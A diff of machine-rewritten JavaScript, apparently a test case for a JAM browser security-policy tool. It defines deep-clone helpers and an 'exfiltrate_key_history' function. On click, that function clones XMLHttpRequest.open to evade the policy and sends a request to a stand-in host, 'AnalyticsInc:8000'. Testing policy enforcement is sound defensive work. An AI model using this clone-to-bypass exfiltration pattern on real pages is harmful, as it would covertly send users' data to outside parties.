@@ -1,81 +1,77 @@
 function clone(obj$$16) {
-  var v11 = obj$$16 == null;
-  var v19 = !v11;
-  if (v19) {
-    var v18 = typeof obj$$16;
-    v11 = v18 != "object";
+  var v9 = obj$$16 == null;
+  var v15 = !v9;
+  if (v15) {
+    var v14 = typeof obj$$16;
+    v9 = v14 != "object";
   }
-  var v0 = v11;
+  var v0 = v9;
   if (v0) {
     return obj$$16;
   }
   var temp = {};
   var key$$14;
   for (key$$14 in obj$$16) {
-    var v1 = temp;
-    var v2 = key$$14;
     introspect(JAM.policy.p1) {
-      var v12 = obj$$16[key$$14]
+      var v1 = obj$$16[key$$14]
     }
-    var v28 = clone(v12);
-    JAM.set(v1, v2, v28);
+    var v24 = clone(v1);
+    JAM.set(temp, key$$14, v24);
   }
   return temp;
 }
 function clone2(obj$$17) {
-  var v3 = obj$$17.cloneNode;
-  if (v3) {
+  var v2 = obj$$17.cloneNode;
+  if (v2) {
     return obj$$17.cloneNode(true);
   }
-  var v4;
-  var v13 = obj$$17 instanceof Array;
-  if (v13) {
-    v4 = [];
+  var v3;
+  var v10 = obj$$17 instanceof Array;
+  if (v10) {
+    v3 = [];
   } else {
-    v4 = {};
+    v3 = {};
   }
-  var copy = v4;
+  var copy = v3;
   var attr;
   for (attr in obj$$17) {
     introspect(JAM.policy.p1) {
-      var v27 = obj$$17[attr]
+      var v23 = obj$$17[attr]
     }
-    var v23 = typeof v27;
-    var v20 = v23 == "function";
-    var v25 = !v20;
-    if (v25) {
+    var v19 = typeof v23;
+    var v16 = v19 == "function";
+    var v21 = !v16;
+    if (v21) {
       introspect(JAM.policy.p1) {
-        var v24 = obj$$17[attr]
+        var v20 = obj$$17[attr]
       }
-      v20 = v24 == null;
+      v16 = v20 == null;
     }
-    var v14 = v20;
-    var v22 = !v14;
-    if (v22) {
+    var v11 = v16;
+    var v18 = !v11;
+    if (v18) {
       introspect(JAM.policy.p1) {
-        var v26 = obj$$17[attr]
+        var v22 = obj$$17[attr]
       }
-      var v21 = v26.clone2;
-      v14 = !v21;
+      var v17 = v22.clone2;
+      v11 = !v17;
     }
-    var v8 = v14;
-    if (v8) {
+    var v6 = v11;
+    if (v6) {
       JAM.set(copy, attr, JAM.get(obj$$17, attr, JAM.policy.p1));
     } else {
       introspect(JAM.policy.p1) {
-        var v15 = obj$$17[attr]
+        var v12 = obj$$17[attr]
       }
-      var v7 = v15 == obj$$17;
-      if (v7) {
+      var v5 = v12 == obj$$17;
+      if (v5) {
         JAM.set(copy, attr, copy);
       } else {
-        var v5 = copy;
-        var v6 = attr;
         introspect(JAM.policy.p1) {
-          var v16 = obj$$17[attr]
+          var v4 = obj$$17[attr]
         }
-        var v29 = v16.clone2();
-        JAM.set(v5, v6, v29);
+        var v25 = v4.clone2();
+        JAM.set(copy, attr, v25);
       }
     }
   }
@@ -83,15 +79,15 @@ function clone2(obj$$17) {
 }
 function exfiltrate_key_history() {
   xmlhttp = new XMLHttpRequest;
-  var v9 = xmlhttp;
+  var v7 = xmlhttp;
   introspect(JAM.policy.p1) {
-    var v17 = xmlhttp.open
+    var v13 = xmlhttp.open
   }
-  var v30 = clone(v17);
-  v9.opennew = v30;
+  var v26 = clone(v13);
+  v7.opennew = v26;
   JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true]);
   xmlhttp.send(null);
   return;
 }
-var v10 = document.getElementById("test");
-JAM.set(v10, "onclick", exfiltrate_key_history)
+var v8 = document.getElementById("test");
+JAM.set(v8, "onclick", exfiltrate_key_history)
